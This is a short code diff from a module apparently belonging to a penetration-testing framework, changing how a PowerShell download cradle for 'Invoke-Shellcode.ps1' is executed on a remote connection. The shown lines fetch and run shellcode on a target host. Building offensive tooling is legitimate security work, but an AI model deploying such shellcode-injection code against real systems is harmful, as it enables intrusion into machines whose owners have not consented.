@@ -61,8 +61,8 @@ class CMEModule:
             payload += " -ProcessID {}".format(self.procid)
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-Shellcode.ps1', payload, post_back=False)
-        ps_command = create_ps_command(launcher, force_ps32=True)
-        connection.execute(ps_command)
+
+        connection.ps_execute(launcher, force_ps32=True)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
